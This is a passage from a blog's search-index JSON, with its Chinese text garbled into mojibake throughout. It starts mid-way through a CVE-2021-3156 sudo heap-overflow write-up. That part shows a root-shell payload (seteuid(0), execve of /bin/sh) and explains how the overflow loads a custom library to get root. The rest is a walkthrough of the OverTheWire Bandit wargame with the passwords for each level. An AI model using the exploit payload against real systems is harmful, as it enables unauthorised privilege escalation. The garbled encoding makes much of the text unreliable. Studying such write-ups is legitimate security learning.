seteuid(0); setegid(0); return execve(&quot;/bin/sh&quot;, argv, NULL);&#125; åŠ è½½è¯¥åº“å‡½æ•°å³å¯get shell. æ€»ç»“åŸºæœ¬æ€è·¯æ˜¯ï¼šé€šè¿‡è¾“å…¥ç‰¹å®šç¯å¢ƒå˜é‡ï¼Œä½¿å¾—é‡Šæ”¾ç‰¹å®šå¤§å°LC_ALLå˜é‡å †å—å ä½åˆ°service_userç»“æ„ä½“ä¸Šæ–¹ä¸ºç›®æ ‡æ¥è¿›è¡Œï¼Œä½¿å¾—serviceç»“æ„ä½“åŠ è½½è‡ªå®šä¹‰åº“å‡½æ•°ã€‚ åœ¨é˜…è¯»Qualysçš„æŠ¥å‘Šæ—¶æ³¨æ„åˆ°ï¼Œåœ¨å¯»æ‰¾åˆ©ç”¨ç‚¹æ—¶ä½¿ç”¨äº†fuzzçš„æ–¹æ³•ï¼Œæ‰¾åˆ°äº†ä¸‰ä¸ªè¾ƒä¸ºç¨³å®šçš„åˆ©ç”¨ç‚¹ï¼Œè¿™ç‚¹å€¼å¾—ä»¥åæ·±å…¥äº†è§£ã€‚","categories":[{"name":"CVE","slug":"CVE","permalink":"http://example.com/categories/CVE/"}],"tags":[{"name":"å †æº¢å‡º","slug":"å †æº¢å‡º","permalink":"http://example.com/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"name":"CVE-2021-3156","slug":"CVE-2021-3156","permalink":"http://example.com/tags/CVE-2021-3156/"}]},{"title":"linux_baseé¢˜è§£","slug":"linux_Base","date":"2021-04-07T17:24:39.000Z","updated":"2022-03-25T13:51:43.000Z","comments":true,"path":"2021/04/08/linux_Base/","link":"","permalink":"http://example.com/2021/04/08/linux_Base/","excerpt":"","text":"linux_baseé¢˜è§£é‡æ–°ç³»ç»Ÿåœ°è¿‡ä¸€éï¼Œä¸»è¦æ˜¯ä¸€äº›Linuxçš„åŸºæœ¬å‘½ä»¤å’ŒåŸºç¡€çŸ¥è¯†ã€‚ Level_0What is SSH ?According to SearchSecurity, SSH is a network protocol that gives users, particularly system administrators, a secure way to access a computer over an unsecured network. Host Name : bandit.labs.overthewire.org Username : bandit0 Password : bandit0 Port Number : 2220 1ssh bandit0@bandit.labs.overthewire.org -p 2220 Level_0â¡Level_1Usage of ls and cat:1234bandit0@bandit:~$ lsreadmebandit0@bandit:~$ cat readme boJ9jbbUNNfktd78OOpsqOltutMc3MY1 Level_1â¡Level_2cat the file stars with dash:1234bandit1@bandit:~$ cat ./-CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9bandit1@bandit:~$ cat &lt;-CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 Level_2â¡Level_3Useâ€ \\â€œ to escape character1234bandit2@bandit:~$ lsspaces in this filenamebandit2@bandit:~$ cat spaces\\ in\\ this\\ filename UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK Level_3â¡Level_4Usage of command : ls ã€cd:The ls command is used to view the contents of a directory. By default, this command will display the contents of your current working directory. If you want to see the content of other directories, type ls and then the directoryâ€™s path. For example, enter ls /home/username/Documents to view the content of Documents. There are variations you can use with the ls command: ls -R will list all the files in the sub-directories as well ls -a will show the hidden files ls -al will list the files and directories with detailed information like the permissions, size, owner, etc. Hidden file: start with . is hidden file 123456789101112bandit3@bandit:~$ lsinherebandit3@bandit:~$ cd inhere/bandit3@bandit:~/inhere$ lsbandit3@bandit:~/inhere$ ls -altotal 12drwxr-xr-x 2 root root 4096 May 7 2020 .drwxr-xr-x 3 root root 4096 May 7 2020 ..-rw-r----- 1 bandit4 bandit3 33 May 7 2020 .hiddenbandit3@bandit:~/inhere$ cat .hidden pIwrPrtPN36QITSp3EQaw936yaFoFgAB Level_4â¡Level_5Usage of command : file1file [-bcLvz][-f &lt;åç§°æ–‡ä»¶&gt;][-m &lt;é­”æ³•æ•°å­—æ–‡ä»¶&gt;...][æ–‡ä»¶æˆ–ç›®å½•...] -b åˆ—å‡ºè¾¨è¯†ç»“æœæ—¶ï¼Œä¸æ˜¾ç¤ºæ–‡ä»¶åç§°ã€‚ -c è¯¦ç»†æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ï¼Œä¾¿äºæ’é”™æˆ–åˆ†æç¨‹åºæ‰§è¡Œçš„æƒ…å½¢ã€‚ -f&lt;åç§°æ–‡ä»¶&gt; æŒ‡å®šåç§°æ–‡ä»¶ï¼Œå…¶å†…å®¹æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶åç§°æ—¶ï¼Œè®©fileä¾åºè¾¨è¯†è¿™äº›æ–‡ä»¶ï¼Œæ ¼å¼ä¸ºæ¯åˆ—ä¸€ä¸ªæ–‡ä»¶åç§°ã€‚ -L ç›´æ¥æ˜¾ç¤ºç¬¦å·è¿æ¥æ‰€æŒ‡å‘çš„æ–‡ä»¶çš„ç±»åˆ«ã€‚ -m&lt;é­”æ³•æ•°å­—æ–‡ä»¶&gt; æŒ‡å®šé­”æ³•æ•°å­—æ–‡ä»¶ã€‚ -v æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ -z å°è¯•å»è§£è¯»å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚ 1234567891011121314151617181920bandit4@bandit:~$ lsinherebandit4@bandit:~$ cd inhere/bandit4@bandit:~/inhere$ ls-file00 -file02 -file04 -file06 -file08-file01 -file03 -file05 -file07 -file09bandit4@bandit:~/inhere$ file ./*./-file00: data./-file01: data./-file02: data./-file03: data./-file04: data./-file05: data./-file06: data./-file07: ASCII text./-file08: data./-file09: databandit4@bandit:~/inhere$ cat ./-file07koReBOKuIDDepwhWk7jZC0RTdopnAYKh Level_5â¡Level_6Usage of file:12345678910bandit5@bandit:~/inhere$ lsmaybehere00 maybehere04 maybehere08 maybehere12 maybehere16maybehere01 maybehere05 maybehere09 maybehere13 maybehere17maybehere02 maybehere06 maybehere10 maybehere14 maybehere18maybehere03 maybehere07 maybehere11 maybehere15 maybehere19bandit5@bandit:~/inhere$ find ./ -type f -size 1033c./maybehere07/.file2bandit5@bandit:~/inhere$ cat ./maybehere07/.file2DXjZPULLxYr17uwoI01bNLQbtFemEgo7 Level_6â¡Level_7Learn about redirection:Analyse: The password for the next level is stored somewhere on the server and has all of the following properties: owned by user bandit7 owned by group bandit6 33 bytes in size So this is exp: find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null / from root folder -user the owner of the file. -group the group owner of the file. -size the size of the file. 2&gt;/dev/null redirects error messages to null so that they do not show on stdout. 1234bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null/var/lib/dpkg/info/bandit7.passwordbandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs Level_7â¡Level_8Learn about the pipe and usage if grep:grep commandIt lets you search through all the text in a given file. To illustrate, grep blue notepad.txt will search for the word blue in the notepad file. Lines that contain the searched word will be displayed fully. 1234567-i å¿½ç•¥å¤§å°å†™-E å¯ç”¨POSIXæ‰©å±•æ­£åˆ™è¡¨è¾¾å¼-P å¯ç”¨perlæ­£åˆ™-o åªè¾“å‡ºæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„å†…å®¹-w æ•´å­—åŒ¹é…-v ä¸åŒ¹é…çš„-n è¾“å‡ºè¡Œå· 12bandit7@bandit:~$ cat data.txt |grep millionthmillionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV Level_8â¡Level_9Learn about the sort and uniq:sort: 1sort [-bcdfimMnr][-o&lt;è¾“å‡ºæ–‡ä»¶&gt;][-t&lt;åˆ†éš”å­—ç¬¦&gt;][+&lt;èµ·å§‹æ ä½&gt;-&lt;ç»“æŸæ ä½&gt;][--help][--verison][æ–‡ä»¶] -u åœ¨è¾“å‡ºè¡Œä¸­å»é™¤é‡å¤è¡Œã€‚ -r sorté»˜è®¤çš„æ’åºæ–¹å¼æ˜¯å‡åºï¼Œå¦‚æœæƒ³æ”¹æˆé™åºï¼Œå°±åŠ ä¸ª-rå³å¯ã€‚ -n sortè¦ä»¥æ•°å€¼æ¥æ’åº -t æŒ‡å®šåˆ†å‰²ç¬¦ -k æŒ‡å®šç¬¬å‡ åˆ—æ’åº uniq: 1uniq [-cdu][-f&lt;æ ä½&gt;][-s&lt;å­—ç¬¦ä½ç½®&gt;][-w&lt;å­—ç¬¦ä½ç½®&gt;][--help][--version][è¾“å…¥æ–‡ä»¶][è¾“å‡ºæ–‡ä»¶] -c, â€”count åœ¨æ¯è¡Œå‰æ˜¾ç¤ºè¯¥è¡Œé‡å¤æ¬¡æ•° -d, â€”repeated åªè¾“å‡ºé‡å¤çš„è¡Œ -D, â€”all-repeated åªè¾“å‡ºé‡å¤çš„è¡Œï¼Œä¸è¿‡æœ‰å‡ è¡Œè¾“å‡ºå‡ è¡Œ -f, â€”skip-fields=N -f å¿½ç•¥çš„æ®µæ•°ï¼Œ-f 1 å¿½ç•¥ç¬¬ä¸€æ®µ -i, â€”ignore-case ä¸åŒºåˆ†å¤§å°å†™ -s, â€”skip-chars=N ä¸-fæœ‰ç‚¹åƒï¼Œä¸è¿‡-sæ˜¯å¿½ç•¥ï¼Œåé¢å¤šå°‘ä¸ªå­—ç¬¦ -s 5å°±å¿½ç•¥åé¢5ä¸ªå­—ç¬¦ -u, â€”unique å»é™¤é‡å¤çš„åï¼Œå…¨éƒ¨æ˜¾ç¤ºå‡ºæ¥ï¼Œæ ¹mysqlçš„distinctåŠŸèƒ½ä¸Šæœ‰ç‚¹åƒ 1234bandit8@bandit:~$ lsdata.txtbandit8@bandit:~$ sort data.txt | uniq -uUsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR Level_9â¡Level_10Usage of grep:strings : export strings in binary file 12345678910111213141516bandit9@bandit:~$ lsdata.txtbandit9@bandit:~$ cat data.txt |grep =Binary file (standard input) matchesbandit9@bandit:~$ strings data.txt |grep =========== the*2i&quot;4=:G e========== password&lt;I=zsGiZ)========== isA=|t&amp;EZdb=c^ LAh=3G*SF=s&amp;========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk Level_10â¡Level_11Whatâ€™s base64?Base64æ˜¯ä¸€ç§åŸºäº64ä¸ªå¯æ‰“å°å­—ç¬¦æ¥è¡¨ç¤ºäºŒè¿›åˆ¶æ•°æ®çš„è¡¨ç¤ºæ–¹æ³•ã€‚ç”±äºï¼Œæ‰€ä»¥æ¯6ä¸ªæ¯”ç‰¹ä¸ºä¸€ä¸ªå•å…ƒï¼Œå¯¹åº”æŸä¸ªå¯æ‰“å°å­—ç¬¦ã€‚3ä¸ªå­—èŠ‚ç›¸å½“äº24ä¸ªæ¯”ç‰¹ï¼Œå¯¹åº”äº4ä¸ªBase64å•å…ƒï¼Œå³3ä¸ªå­—èŠ‚å¯ç”±4ä¸ªå¯æ‰“å°å­—ç¬¦æ¥è¡¨ç¤ºã€‚åœ¨Base64ä¸­çš„å¯æ‰“å°å­—ç¬¦åŒ…æ‹¬å­—æ¯A-Zã€a-zã€æ•°å­—0-9ï¼Œè¿™æ ·å…±æœ‰62ä¸ªå­—ç¬¦ï¼Œæ­¤å¤–ä¸¤ä¸ªå¯æ‰“å°ç¬¦å·åœ¨ä¸åŒçš„ç³»ç»Ÿä¸­è€Œä¸åŒã€‚ä¸€äº›å¦‚uuencodeçš„å…¶ä»–ç¼–ç æ–¹æ³•ï¼Œå’Œä¹‹åBinHexçš„ç‰ˆæœ¬ä½¿ç”¨ä¸åŒçš„64å­—ç¬¦é›†æ¥ä»£è¡¨6ä¸ªäºŒè¿›åˆ¶æ•°å­—ï¼Œä½†æ˜¯ä¸è¢«ç§°ä¸ºBase64ã€‚ why base64ï¼Ÿ This_is_why_base64 12bandit10@bandit:~$ cat data.txt | base64 -dThe password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR Level_11â¡Level_12ROT13:I_know_whatâ€™s_ROT13 command tr: 123456tr [é€‰é¡¹]â€¦ é›†åˆ1 [é›†åˆ2]é€‰é¡¹è¯´æ˜ï¼š-c, -C, â€“complement ç”¨é›†åˆ1ä¸­çš„å­—ç¬¦ä¸²æ›¿æ¢ï¼Œè¦æ±‚å­—ç¬¦é›†ä¸ºASCIIã€‚-d, â€“delete åˆ é™¤é›†åˆ1ä¸­çš„å­—ç¬¦è€Œä¸æ˜¯è½¬æ¢-s, â€“squeeze-repeats åˆ é™¤æ‰€æœ‰é‡å¤å‡ºç°å­—ç¬¦åºåˆ—ï¼Œåªä¿ç•™ç¬¬ä¸€ä¸ªï¼›å³å°†é‡å¤å‡ºç°å­—ç¬¦ä¸²å‹ç¼©ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚-t, â€“truncate-set1 å…ˆåˆ é™¤ç¬¬ä¸€å­—ç¬¦é›†è¾ƒç¬¬äºŒå­—ç¬¦é›†å¤šå‡ºçš„å­—ç¬¦ 12bandit11@bandit:~$ cat data.txt | tr &quot;A-Za-z&quot; &quot;N-ZA-Mn-za-m&quot;The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu Level_12â¡Level_13Learn about hexdump&amp;xxd&amp;gzip&amp;bzip&amp;tar: Linux hexdumpå‘½ä»¤ä¸€èˆ¬ç”¨æ¥æŸ¥çœ‹â€œäºŒè¿›åˆ¶â€æ–‡ä»¶çš„åå…­è¿›åˆ¶ç¼–ç ï¼Œä½†å®é™…ä¸Šå®ƒèƒ½æŸ¥çœ‹ä»»ä½•æ–‡ä»¶ï¼Œè€Œä¸åªé™äºäºŒè¿›åˆ¶æ–‡ä»¶ã€‚ 1hexdump [é€‰é¡¹] [æ–‡ä»¶]... 123456789-n length åªæ ¼å¼åŒ–è¾“å…¥æ–‡ä»¶çš„å‰lengthä¸ªå­—èŠ‚ã€‚-C è¾“å‡ºè§„èŒƒçš„åå…­è¿›åˆ¶å’ŒASCIIç ã€‚-b å•å­—èŠ‚å…«è¿›åˆ¶æ˜¾ç¤ºã€‚-c å•å­—èŠ‚å­—ç¬¦æ˜¾ç¤ºã€‚-d åŒå­—èŠ‚åè¿›åˆ¶æ˜¾ç¤ºã€‚-o åŒå­—èŠ‚å…«è¿›åˆ¶æ˜¾ç¤ºã€‚-x åŒå­—èŠ‚åå…­è¿›åˆ¶æ˜¾ç¤ºã€‚-s ä»åç§»é‡å¼€å§‹è¾“å‡ºã€‚-e æŒ‡å®šæ ¼å¼å­—ç¬¦ä¸²ï¼Œæ ¼å¼å­—ç¬¦ä¸²åŒ…å«åœ¨ä¸€å¯¹å•å¼•å·ä¸­ï¼Œæ ¼å¼å­—ç¬¦ä¸²å½¢å¦‚ï¼š&#x27;a/b &quot;format1&quot; &quot;format2&quot;&#x27;ã€‚ æ¯ä¸ªæ ¼å¼å­—ç¬¦ä¸²ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œæ¯ä¸ªç”±ç©ºæ ¼åˆ†éš”ï¼Œç¬¬ä¸€ä¸ªå½¢å¦‚a/bï¼Œbè¡¨ç¤ºå¯¹æ¯bä¸ªè¾“å…¥å­—èŠ‚åº”ç”¨format1æ ¼å¼ï¼Œaè¡¨ç¤ºå¯¹æ¯aä¸ªè¾“å…¥å­—èŠ‚åº”ç”¨format2æ ¼å¼ï¼Œä¸€èˆ¬a&gt;bï¼Œä¸”båªèƒ½ä¸º1ï¼Œ2ï¼Œ4ï¼Œå¦å¤–aå¯ä»¥çœç•¥ï¼Œçœç•¥åˆ™a=1ã€‚format1å’Œformat2ä¸­å¯ä»¥ä½¿ç”¨ç±»ä¼¼printfçš„æ ¼å¼å­—ç¬¦ä¸²ï¼Œå¦‚ï¼š 1234%02dï¼šä¸¤ä½åè¿›åˆ¶%03xï¼šä¸‰ä½åå…­è¿›åˆ¶%02oï¼šä¸¤ä½å…«è¿›åˆ¶%cï¼šå•ä¸ªå­—ç¬¦ç­‰ è¿˜æœ‰ä¸€äº›ç‰¹æ®Šçš„ç”¨æ³•ï¼š 1234%_adï¼šæ ‡è®°ä¸‹ä¸€ä¸ªè¾“å‡ºå­—èŠ‚çš„åºå·ï¼Œç”¨åè¿›åˆ¶è¡¨ç¤ºã€‚%_axï¼šæ ‡è®°ä¸‹ä¸€ä¸ªè¾“å‡ºå­—èŠ‚çš„åºå·ï¼Œç”¨åå…­è¿›åˆ¶è¡¨ç¤ºã€‚%_aoï¼šæ ‡è®°ä¸‹ä¸€ä¸ªè¾“å‡ºå­—èŠ‚çš„åºå·ï¼Œç”¨å…«è¿›åˆ¶è¡¨ç¤ºã€‚%_pï¼šå¯¹ä¸èƒ½ä»¥å¸¸è§„å­—ç¬¦æ˜¾ç¤ºçš„ç”¨ . ä»£æ›¿ã€‚ åŒä¸€è¡Œå¦‚æœè¦æ˜¾ç¤ºå¤šä¸ªæ ¼å¼å­—ç¬¦ä¸²ï¼Œåˆ™å¯ä»¥è·Ÿå¤šä¸ª-eé€‰é¡¹ã€‚ Demo: 1234hexdump -e &#x27;16/1 &quot;%02X &quot; &quot; | &quot;&#x27; -e &#x27;16/1 &quot;%_p&quot; &quot;\\n&quot;&#x27; test00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F | ................ 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F | ................ 20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F | !&quot;#$%&amp;&#x27;()*+,-./ xxd xxdæ˜¯äºŒè¿›åˆ¶æŸ¥çœ‹å‘½ä»¤ï¼Œé»˜è®¤å°†2æ–‡ä»¶æ˜¾ç¤ºä¸º16è¿›åˆ¶å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚ Usage: 1xxd [options] [infile [outfile]] or 1xxd -r [-s [-]offset] [-c cols] [-ps] [infile [outfile]] options: -a ç¼ºçœå¿½ç•¥è½¬æ¢: ä½¿ç”¨â€˜*â€™æ›¿æ¢ç©ºè¡Œ. -b äºŒè¿›æ•°æ•°æ®è½¬å‚¨ (ä¸ -ps,-i,-rä¸å…¼å®¹). é»˜è®¤ä¸º16è¿›åˆ¶. -c cols æ¯è¡Œå¤šå°‘åˆ—octetsï¼ˆç‰¹åˆ¶8æ¯”ç‰¹çš„å­—èŠ‚ï¼‰. é»˜è®¤ä¸º16åˆ—(-i: 12, -ps: 30). -E ä½¿ç”¨EBCDICå­—ç¬¦é›†. é»˜è®¤ä¸ºASCIIå­—ç¬¦é›†. -e å°ç«¯æ¨¡å¼è½¬å‚¨ (ä¸ -ps,-i,-rä¸å…¼å®¹). -g åœ¨æ­£å¸¸è¾“å‡ºä¸­ï¼Œæ¯ç»„å…«ä½å­—èŠ‚æ•°. é»˜è®¤ä¸º2ä¸ª (-e: 4). -h è¾“å‡ºæ­¤å¸®åŠ©. -i ä½¿ç”¨Cè¯­è¨€æ–‡ä»¶æ ·å¼è¾“å‡º. -r reverse operation: convert (or patch) hexdump into binary. bzip2ã€gzipï¼š è§£å‹å‹ç¼©å‘½ä»¤ Optionsï¼š -d ï¼šè§£å‹ -kï¼šä¿ç•™æºæ–‡ä»¶ tar: tarå¯ä»¥ä¸ºlinuxçš„æ–‡ä»¶å’Œç›®å½•åˆ›å»ºæ¡£æ¡ˆã€‚åˆ©ç”¨tarï¼Œå¯ä»¥ä¸ºæŸä¸€ç‰¹å®šæ–‡ä»¶åˆ›å»ºæ¡£æ¡ˆï¼ˆå¤‡ä»½æ–‡ä»¶ï¼‰ï¼Œä¹Ÿå¯ä»¥åœ¨æ¡£æ¡ˆä¸­æ”¹å˜æ–‡ä»¶ï¼Œæˆ–è€…å‘æ¡£æ¡ˆä¸­åŠ å…¥æ–°çš„æ–‡ä»¶ã€‚taræœ€åˆè¢«ç”¨æ¥åœ¨ç£å¸¦ä¸Šåˆ›å»ºæ¡£æ¡ˆï¼Œç°åœ¨ï¼Œç”¨æˆ·å¯ä»¥åœ¨ä»»ä½•è®¾å¤‡ä¸Šåˆ›å»ºæ¡£æ¡ˆã€‚åˆ©ç”¨tarå‘½ä»¤ï¼Œå¯ä»¥æŠŠä¸€å¤§å †çš„æ–‡ä»¶å’Œç›®å½•å…¨éƒ¨æ‰“åŒ…æˆä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™å¯¹äºå¤‡ä»½æ–‡ä»¶æˆ–å°†å‡ ä¸ªæ–‡ä»¶ç»„åˆæˆä¸ºä¸€ä¸ªæ–‡ä»¶ä»¥ä¾¿äºç½‘ç»œä¼ è¾“æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚ é¦–å…ˆè¦å¼„æ¸…ä¸¤ä¸ªæ¦‚å¿µï¼šæ‰“åŒ…å’Œå‹ç¼©ã€‚æ‰“åŒ…æ˜¯æŒ‡å°†ä¸€å¤§å †æ–‡ä»¶æˆ–ç›®å½•å˜æˆä¸€ä¸ªæ€»çš„æ–‡ä»¶ï¼›å‹ç¼©åˆ™æ˜¯å°†ä¸€ä¸ªå¤§çš„æ–‡ä»¶é€šè¿‡ä¸€äº›å‹ç¼©ç®—æ³•å˜æˆä¸€ä¸ªå°æ–‡ä»¶ã€‚ ä¸ºä»€ä¹ˆè¦åŒºåˆ†è¿™ä¸¤ä¸ªæ¦‚å¿µå‘¢ï¼Ÿè¿™æºäºLinuxä¸­å¾ˆå¤šå‹ç¼©ç¨‹åºåªèƒ½é’ˆå¯¹ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œè¿™æ ·å½“ä½ æƒ³è¦å‹ç¼©ä¸€å¤§å †æ–‡ä»¶æ—¶ï¼Œä½ å¾—å…ˆå°†è¿™ä¸€å¤§å †æ–‡ä»¶å…ˆæ‰“æˆä¸€ä¸ªåŒ…ï¼ˆtarå‘½ä»¤ï¼‰ï¼Œç„¶åå†ç”¨å‹ç¼©ç¨‹åºè¿›è¡Œå‹ç¼©ï¼ˆgzip bzip2å‘½ä»¤ï¼‰ã€‚ 1tar(é€‰é¡¹)(å‚æ•°) optionsï¼š 1234567891011121314151617181920212223-Aæˆ–--catenateï¼šæ–°å¢æ–‡ä»¶åˆ°ä»¥å­˜åœ¨çš„å¤‡ä»½æ–‡ä»¶ï¼›-Bï¼šè®¾ç½®åŒºå—å¤§å°ï¼›-cæˆ–--createï¼šå»ºç«‹æ–°çš„å¤‡ä»½æ–‡ä»¶ï¼›-C &lt;ç›®å½•&gt;ï¼šè¿™ä¸ªé€‰é¡¹ç”¨åœ¨è§£å‹ç¼©ï¼Œè‹¥è¦åœ¨ç‰¹å®šç›®å½•è§£å‹ç¼©ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªé€‰é¡¹ã€‚-dï¼šè®°å½•æ–‡ä»¶çš„å·®åˆ«ï¼›-xæˆ–--extractæˆ–--getï¼šä»å¤‡ä»½æ–‡ä»¶ä¸­è¿˜åŸæ–‡ä»¶ï¼›-tæˆ–--listï¼šåˆ—å‡ºå¤‡ä»½æ–‡ä»¶çš„å†…å®¹ï¼›-zæˆ–--gzipæˆ–--ungzipï¼šé€šè¿‡gzipæŒ‡ä»¤å¤„ç†å¤‡ä»½æ–‡ä»¶ï¼›-Zæˆ–--compressæˆ–--uncompressï¼šé€šè¿‡compressæŒ‡ä»¤å¤„ç†å¤‡ä»½æ–‡ä»¶ï¼›-f&lt;å¤‡ä»½æ–‡ä»¶&gt;æˆ–--file=&lt;å¤‡ä»½æ–‡ä»¶&gt;ï¼šæŒ‡å®šå¤‡ä»½æ–‡ä»¶ï¼›-væˆ–--verboseï¼šæ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ï¼›-rï¼šæ·»åŠ æ–‡ä»¶åˆ°å·²ç»å‹ç¼©çš„æ–‡ä»¶ï¼›-uï¼šæ·»åŠ æ”¹å˜äº†å’Œç°æœ‰çš„æ–‡ä»¶åˆ°å·²ç»å­˜åœ¨çš„å‹ç¼©æ–‡ä»¶ï¼›-jï¼šæ”¯æŒbzip2è§£å‹æ–‡ä»¶ï¼›-vï¼šæ˜¾ç¤ºæ“ä½œè¿‡ç¨‹ï¼›-lï¼šæ–‡ä»¶ç³»ç»Ÿè¾¹ç•Œè®¾ç½®ï¼›-kï¼šä¿ç•™åŸæœ‰æ–‡ä»¶ä¸è¦†ç›–ï¼›-mï¼šä¿ç•™æ–‡ä»¶ä¸è¢«è¦†ç›–ï¼›-wï¼šç¡®è®¤å‹ç¼©æ–‡ä»¶çš„æ­£ç¡®æ€§ï¼›-pæˆ–--same-permissionsï¼šç”¨åŸæ¥çš„æ–‡ä»¶æƒé™è¿˜åŸæ–‡ä»¶ï¼›-Pæˆ–--absolute-namesï¼šæ–‡ä»¶åä½¿ç”¨ç»å¯¹åç§°ï¼Œä¸ç§»é™¤æ–‡ä»¶åç§°å‰çš„â€œ/â€å·ï¼›-N &lt;æ—¥æœŸæ ¼å¼&gt; æˆ– --newer=&lt;æ—¥æœŸæ—¶é—´&gt;ï¼šåªå°†è¾ƒæŒ‡å®šæ—¥æœŸæ›´æ–°çš„æ–‡ä»¶ä¿å­˜åˆ°å¤‡ä»½æ–‡ä»¶é‡Œï¼›--exclude=&lt;èŒƒæœ¬æ ·å¼&gt;ï¼šæ’é™¤ç¬¦åˆèŒƒæœ¬æ ·å¼çš„æ–‡ä»¶ã€‚ 123456789bandit12@bandit:~$ ls -altotal 24drwxr-xr-x 2 root root 4096 May 7 2020 .drwxr-xr-x 41 root root 4096 May 7 2020 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-rw-r----- 1 bandit13 bandit12 2582 May 7 2020 data.txt-rw-r--r-- 1 root root 675 May 15 2017 .profile æŸ¥çœ‹data.txtæ–‡ä»¶åå‘ç°æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶hexdumpåçš„æ–‡ä»¶ï¼Œä½†æ˜¯è¯¥ç›®å½•ä¸‹æˆ‘ä»¬å¹¶æ²¡æœ‰æƒé™å¯¹è¯¥æ–‡ä»¶è¿›è¡Œxxdæ“ä½œ ls -al / rootæŸ¥çœ‹rootç›®å½•ä¸‹tmpæ–‡ä»¶æˆ‘ä»¬å…·æœ‰æƒé™ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253bandit12@bandit:~$ mkdir /tmp/what_a_fuckbandit12@bandit:~$ cp data.txt /tmp/what_a_fuck/data.txtbandit12@bandit:~$ cd /tmp/what_a_fuckbandit12@bandit:/tmp/what_a_fuck$ lsdata.txtbandit12@bandit:/tmp/what_a_fuck$ xxd -r data.txt &gt;data.binbandit12@bandit:/tmp/what_a_fuck$ lsdata.bin data.txtbandit12@bandit:/tmp/what_a_fuck$ file data.bindata.bin: gzip compressed data, was &quot;data2.bin&quot;, last modified: Thu May 7 18:14:30 2020, max compression, from Unixbandit12@bandit:/tmp/what_a_fuck$ mv data.bin data.gzbandit12@bandit:/tmp/what_a_fuck$ gzip -d data.gz bandit12@bandit:/tmp/what_a_fuck$ lsdata data.txtbandit12@bandit:/tmp/what_a_fuck$ file datadata: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/what_a_fuck$ mv data data.bz2bandit12@bandit:/tmp/what_a_fuck$ bzip2 -d data.bz2 bandit12@bandit:/tmp/what_a_fuck$ lsdata data.txtbandit12@bandit:/tmp/what_a_fuck$ file datadata: gzip compressed data, was &quot;data4.bin&quot;, last modified: Thu May 7 18:14:30 2020, max compression, from Unixbandit12@bandit:/tmp/what_a_fuck$ mv data data.gzbandit12@bandit:/tmp/what_a_fuck$ gzip -d data.gz bandit12@bandit:/tmp/what_a_fuck$ lsdata data.txtbandit12@bandit:/tmp/what_a_fuck$ file datadata: POSIX tar archive (GNU)bandit12@bandit:/tmp/what_a_fuck$ tar -xvf datadata5.binbandit12@bandit:/tmp/what_a_fuck$ file data5.bin data5.bin: POSIX tar archive (GNU)bandit12@bandit:/tmp/what_a_fuck$ tar -xvf data5.bin data6.binbandit12@bandit:/tmp/what_a_fuck$ file data6.bin data6.bin: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/what_a_fuck$ mv data6.bin fuck.bz2bandit12@bandit:/tmp/what_a_fuck$ bzip2 -d fuck.bz2 bandit12@bandit:/tmp/what_a_fuck$ lsdata data5.bin data.txt fuckbandit12@bandit:/tmp/what_a_fuck$ file fuckfuck: POSIX tar archive (GNU)bandit12@bandit:/tmp/what_a_fuck$ tar -xvf fuckdata8.binbandit12@bandit:/tmp/what_a_fuck$ file data8.bin data8.bin: gzip compressed data, was &quot;data9.bin&quot;, last modified: Thu May 7 18:14:30 2020, max compression, from Unixbandit12@bandit:/tmp/what_a_fuck$ mv data8.bin shit.gzbandit12@bandit:/tmp/what_a_fuck$ gzip -d shit.gz bandit12@bandit:/tmp/what_a_fuck$ file shitshit: ASCII textbandit12@bandit:/tmp/what_a_fuck$ cat shit The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL Level_13â¡Level_14ç”¨æ‰€ç»™å¯†é’¥ç™»å½•bandit14è´¦å·è¿æ¥åˆ°ä¸»æœºå³å¯ 123456bandit13@bandit:~$ lssshkey.privatebandit13@bandit:~$ ssh -i sshkey.private bandit14@localhostbandit14@bandit:/etc$ cd /etc/bandit_passbandit14@bandit:/etc/bandit_pass$ cat bandit144wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Level_14â¡Level_15Man is a good command ğŸ™‚ Learn about ncNAME nc â€” arbitrary TCP and UDP connections and listens SYNOPSIS nc [-46bCDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl] [-m minttl] [-O length] [-P proxy_username] [-p source_port] [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]] [-Z peercertfile] [destination] [port] 